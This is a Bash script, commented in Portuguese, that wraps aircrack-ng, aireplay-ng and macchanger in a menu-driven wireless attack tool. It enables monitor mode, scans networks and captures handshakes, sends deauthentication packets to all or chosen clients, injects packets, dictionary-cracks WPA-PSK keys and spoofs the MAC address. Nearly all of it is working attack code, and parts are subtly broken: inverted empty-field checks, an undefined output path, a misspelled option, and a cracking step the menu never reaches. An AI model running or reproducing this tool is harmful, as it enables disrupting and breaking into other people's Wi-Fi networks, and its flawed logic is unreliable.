#!/bin/bash

# Configurando variaveis do shell


#DATA=`date +'%d-%m-%Y-%H-%M'`
#VERSAO="v0.1"
#LICENSE="MIT Lincense"
#HOSTNAME=`hostname`
#INTERFACE=`ip route show | awk '/default via/ {print $5}'`
#INTERFACE=`iw dev | awk '/Interface/' {print $2}'`
#INTERFACEMON=mon0
#GATEWAY=`ip route show | awk '/default via/ {print $3}'`
#IPINTERNO=`ip route show | awk '/src/ {print $9}'`
#IPEXTERNO=`curl -s ipinfo.io/ip`
#MACATUAL=`ip address | awk '/ether/ {print $2}'`
#MACFALSO=
DIR=`pwd`
#ARQTMP=
ARQ=teste

function verificar_dependencias(){
	if ! hash yad 2> /dev/null; then
		echo "[ FALHA ] yad dialog nao instalado!"
		exit 1
	fi

	if ! hash aircrack-ng 2>/dev/null; then
		echo "[ FALHA ] aircrack-ng nao instalado!"
		exit 1
	fi

	#if ! hash xfce4-terminal 2> /dev/null; then
	#	echo "[ FALHA ] xfce4-terminal nao instalado!"
	#	exit 1
	#fi

	if ! hash reaver 2> /dev/null; then
		echo "[ FALHA ] reaver nao instalado!"
		exit 1
	fi
}

function iniciar_mon() {
# Verifica se a interface de monitoramento ja esta ativada
iwconfig wlan0mon &> /dev/null
if [ $? -eq 0 ]; then
	echo "[ OK ] Interface de monitoramento ja estava ativa!" 
	menu
fi

# Adiciona a interface de monitoramento wlan0mon. Caso contrario, emite mensagem de erro
iw dev wlan0 interface add wlan0mon type monitor &> /dev/null && ifconfig wlan0mon up &> /dev/null && clear && \
echo -e "[ OK ] Modo monitoramento ativado!" || echo -e "[ FALHA ] Ocorreram erros em iniciar modo monitor."

}

function matar_processos_que_atrapalham_suite(){
# há alguns processos que atrapalham a suite aircrack-ng
# exemplo: NetworkManager, wpa_supplicant, dhclient, avahi-daemon...
# Para verificar se existem processos que atrapalham a suite aircrack-ng:
# 	airmon-ng check

# Matar processos que atrapalham a suite aircrack-ng
airmon-ng check kill &> /dev/null

}

function conf_interface(){
# Verifica se a interface esta ativa, caso nao esteja, ativa a interface
ifconfig wlan0 &> /dev/null
if [ $? != 0 ]; then
	ifconfig wlan0 up &> /dev/null
fi

}

function varrer_todas_redes(){
# Escanear todas redes encontradas pelo adaptador de rede sem fio. Caso contrario, emite um erro.
(xterm -geometry 85x25 -title "Escaneando todas as redes sem fio alcancadas pela interface de monitoramento $INTERFACE_MON" \
-e "airodump-ng wlan0mon" &) || \
echo -e "[ FALHA ] Ocorreram erros em escanear todas as redes, verifique a interface $INTERFACE_MON esta ativa!"

}

function setar_parametros(){
	PARAMETROS=$(yad --title "Setar parametros" \
	--text "(*) Campos obrigatorios                                      \n" \
	--form \
	--field "* BSSID" "" \
	--field "* ESSID" "" \
	--field "* Channel" "" \
	--field "Client" "" \
	--field "* Monitor" " wlan0mon" \
	--field "* Wordlist" "/usr/share/set/src/fasttrack/wordlist.txt" \
	--button gtk-ok \
	--button cancel \
	--center &)

	#--field "[ Wordlist ]":BTN "yad --file --maximized" \

	BSSID=$(echo "$PARAMETROS" | cut -d '|' -f 1)
	ESSID=$(echo "$PARAMETROS" | cut -d '|' -f 2)
	CHANNEL=$(echo "$PARAMETROS" | cut -d '|' -f 3)
	CLIENT=$(echo "$PARAMETROS" | cut -d '|' -f 4)
	INTERFACE_MON=$(echo "$PARAMETROS" | cut -d '|' -f 5)
	WORDLIST=$(echo "$PARAMETROS" | cut -d '|' -f 6)
	#DIR=$(echo "$PARAMETROS" | cut -d '|' -f 7)
	#ARQ=$(echo "$PARAMETROS" | cut -d '|' -f 8)
}

function varrer_uma_rede() {
setar_parametros

# Verifica se os 4 parametros obrigatorios para uso da função estão setados.
[ -z $BSSID  ] || echo "[ FALHA ] O campo obrigatorio BSSID esta vazio"
[ -z $ESSID ] || echo "[ FALHA ] O campo obrigatorio ESSID esta vazio"
[ -z $CHANNEL ] || echo "[ FALHA ] O campo obrigatorio Channel esta vazio"
[ -z $INTERFACE_MON ] || echo "[ FALHA ] O campo obrigatorio Monitor esta vazio"

# Ajustar a interface de monitoramento para varrer hosts apenas no canal desejado
iw dev $INTERFACE_MON set channel $CHANNEL
# Capture no minimo 5000 (5 mil) pacotes do tipo data frame (#Data) antes de tentar realizar a quebra da senha
(xterm -geometry 85x25 -title "Escaneando rede a sem fio $ESSID" \
-e "airodump-ng --bssid $BSSID --channel $CHANNEL --write $DIR/$ARQ $INTERFACE_MON" &) || \
echo -e "[ FALHA ] Ocorreram erros em escanear a rede sem fio: $ESSID"

}

function deauth_todos_clientes() {
# Envia 1 pacote de Desautenticação para todas as STA conectadas ao AP
(xterm -geometry 85x25 -tilte "Enviando pacotes de desautenticação (Deauth) para todos as STA conectadas a rede sem fio: $ESSID" \
-e  "aireplay-ng -0 1 -a $BSSID -e $ESSID $INTERFACE_MON --ignore-negative-one" &) || \
echo "[ FALHA ] Ocorreram erros em fazer deauth dos hosts no AP: $ESSID"

}

function deauth_cliente_especifico() {
# Envia 1 pacote de Desautenticação para uma STA conectada a um AP especifico
(xterm -geometry 85x25 -title "Desautenticando (Deauth) a STA $CLIENT na rede $ESSID" \
-e "aireplay-ng -0 1 -a $BSSID -c $CLIENT $INTERFACE_MON" --ignore-negative-one &) || \
echo "[ FALHA ] Ocorreram erros em fazer o deuth da STA $CLIENT na rede $ESSID"

}
function deauth_brute_force() {
echo
}

function injetar(){
while true; do
# Realizar testes de injecao contra um AP
(xterm -geometry 85x25 -title "Realizando Injecao de pacotes no AP: $ESSID" \
-e "aireplay-ng -9 -a $BSSID -a $BSSID $INTERFACE_MON --ignore-negative-one") || \
echo "[ FALHA ] Nao foi possivel injetar pacotes no AP: $ESSID"

done

}

function brute_force_psk(){
# Redes que utilizam chaves criptograficas pre-compartilhadas do tipo Personal (PSK) sofrem de ataque de dicionario,
#pois a chave PTK pode ser reproduzida com a captura do 4-way handshake - MORENO, Daniel.

# Realizar a quebra da senha, por meio de um dicionario (wordlist)
(aircrack-ng -w $WORDLIST $OUTPUT/$ARQ) || \
echo "[ FALHA ] Ocorreram erros, verifique a wordlist"

}

function matar_todos_processos() {
# Matar todos processos e, reniciar servicos de gerenciamento de rede
iw dev wlan0mon del
pkill xterm
pkill airodump-ng
pkill aireplay-ng
pkill airmon-ng
pkill yad
service network-manager restart

}

function alterar_mac() {
	ifdown $INTERFACE &> /dev/null || echo "[ ok ] ifdown"
	macchanger -r $INTERFACE &> /dev/null
	ifup $INTERFACE &> /dev/null || echo "[ ok ] ifup"

	MACFALSO=`ip address | awk '/ether/ {print $2}'`

return 0

}

#function ip_publico() {
# Obtem oo endereço ip publico
#IPPUBLICO=`curl -s ipinfo.io/ip`
# precisa testar se o curl executou com sucesso
#}

#function infoap() {
#Host_MAC_info1=`echo $Host_MAC | awk 'BEGIN { FS = ":" } ; { print $1":"$2":"$3}' |$
#Host_MAC_MODEL=`macchanger -l | grep $Host_MAC_info1 | cut -d " " -f 5-`
#echo
#}

#function menu() {
#while true; do
#	MENU=$(yad --title "$TITLE" --list --text="\nKing Size Cracking\n" \
#	--column=" :IMG" \
#	--column="Opcao" \
#	--column="Descricao" \
#	--window-icon="gtk-connect" \
#	--image gtk-index \
#	--image-on-top \
#	--maximized \
#	--no-buttons \
#	find "Monitor" "Ativar modo monitoramento" \
#	find "Escanear" "Escanear todas redes alcancadas" \
#	gtk-execute "Deauth" "Fazer desautenticacao dos hosts no AP" \
#	gtk-execute "Injetar" "Injetar pacotes no AP" \
#	gtk-quit "Sair" "Sair do script")
#
#	MENU=$(echo $MENU | cut -d "|" -f2)
#
#	case "$MENU" in
#		"Monitor") iniciar_mon ;;
#		"Escanear") varrer_todas_redes ;;
#		"Deauth") deauth_todos ;;
#		"Injetar") injetar ;;
#		"Sair") encerrar_todos_processos; exit 0 ;;
#	esac
#done
#}

function menu(){

while true; do
cat << EOF
1. Ativar a interface em modo monitoramento
2. Varrer todas as redes sem fio alcancadas
3. Varrer rede especifica
4. Desautenticar todos as STA de um AP
5. Desautenticar uma STA de um AP
6. Injetar pacotes em um AP
7. Sair

EOF
read -p "> " opt

	case "$opt" in
		"1") iniciar_mon ;;
		"2") varrer_todas_redes ;;
		"3") varrer_uma_rede ;;
		"4") deauth_todos_clientes ;;
		"5") deauth_cliente_especifico ;;
		"6") injetar ;;
		"7") echo "Saindo"; matar_todos_processos; exit 0;;
		"*") echo "Opcao invalida"; sleep 2;;
	esac
done

}


verificar_dependencias
matar_processos_que_atrapalham_suite
#matar_todos_processos; exit 1
conf_interface
menu
